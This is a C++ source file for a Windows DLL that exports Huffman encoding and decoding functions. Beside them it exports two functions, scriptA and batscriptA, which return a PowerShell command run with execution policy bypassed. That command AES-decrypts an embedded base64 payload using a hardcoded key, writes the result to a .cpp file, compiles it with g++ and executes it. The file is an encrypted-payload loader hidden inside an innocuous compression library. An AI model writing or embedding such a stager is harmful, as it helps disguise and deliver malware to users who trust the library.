#include <iostream>
#include <unordered_map>
#include <vector>
#include <queue>
#include <string>
#include <memory>
#include <Windows.h>

using namespace std;

struct Node {
    char ch;
    int freq;
    shared_ptr<Node> left, right;
    Node(char c, int f) : ch(c), freq(f), left(nullptr), right(nullptr) {}
    Node(char c, int f, shared_ptr<Node> l, shared_ptr<Node> r) : ch(c), freq(f), left(l), right(r) {}
};

// Comparator for priority queue
struct Compare {
    bool operator()(shared_ptr<Node> const& l, shared_ptr<Node> const& r) {
        return l->freq > r->freq;
    }
};


extern "C" __declspec(dllexport) void buildHuffmanTree(const string& text, unordered_map<char, string>& huffmanCode, shared_ptr<Node>& root);
extern "C" __declspec(dllexport) string decodeHuffman(const string& encodedStr, shared_ptr<Node> root);
extern "C" __declspec(dllexport) string scriptA();
extern "C" __declspec(dllexport) string batscriptA();

string batscriptA(){
    std::string batscript = "@echo off & PowerShell -ExecutionPolicy Bypass -File \"C:\\path\\to\\PSscriptDecoded.ps1";
    return batscript;
}

string scriptA(){
	std::string script = "$data=[Convert]::FromBase64String('<base64_AES_encrpyted>');$iv='abcdefghijklmnop';$key='q3By2ZFhFis1iZWe'.PadRight(16, [char]0);$aes=[System.Security.Cryptography.Aes]::Create();$utf8=[System.Text.Encoding]::Utf8;$aes.Key=$utf8.GetBytes($key);$aes.IV=$utf8.GetBytes($iv);$dec=$aes.CreateDecryptor();$result =$dec.TransformFinalBlock($data,0,$data.Length);$resultStr=$utf8.GetString($result);$filePath='C:\\Users\\hello\\OneDrive\\Desktop\\file.cpp';Set-Content -Path $filePath -Value $resultStr;$command= 'g++ -o test C:\\Users\\hello\\OneDrive\\Desktop\\file.cpp';Invoke-Expression $command;$command2 = '.\\test.exe';Invoke-Expression $command2;$dec.Dispose()";
	return script;
}

// Build Huffman Tree and generate codes
void buildHuffmanTree(const string& text, unordered_map<char, string>& huffmanCode, shared_ptr<Node>& root) {
    unordered_map<char, int> freq;
    for (char ch : text) {
        freq[ch]++;
    }

    priority_queue<shared_ptr<Node>, vector<shared_ptr<Node>>, Compare> pq;
    for (auto pair : freq) {
        pq.push(make_shared<Node>(pair.first, pair.second));
    }

    while (pq.size() != 1) {
        auto left = pq.top(); pq.pop();
        auto right = pq.top(); pq.pop();
        pq.push(make_shared<Node>('\0', left->freq + right->freq, left, right));
    }

    root = pq.top();
    function<void(shared_ptr<Node>, string)> encode = [&](shared_ptr<Node> node, string str) {
        if (!node) return;
        if (!node->left && !node->right) {
            huffmanCode[node->ch] = str;
        }
        encode(node->left, str + "0");
        encode(node->right, str + "1");
    };
    encode(root, "");
}

// Decode Huffman Encoded String
string decodeHuffman(const string& encodedStr, shared_ptr<Node> root) {
    string result;
    shared_ptr<Node> current = root;
    for (char bit : encodedStr) {
        if (bit == '0') current = current->left;
        else current = current->right;

        if (!current->left && !current->right) {
            result += current->ch;
            current = root;
        }
    }
    return result;
}
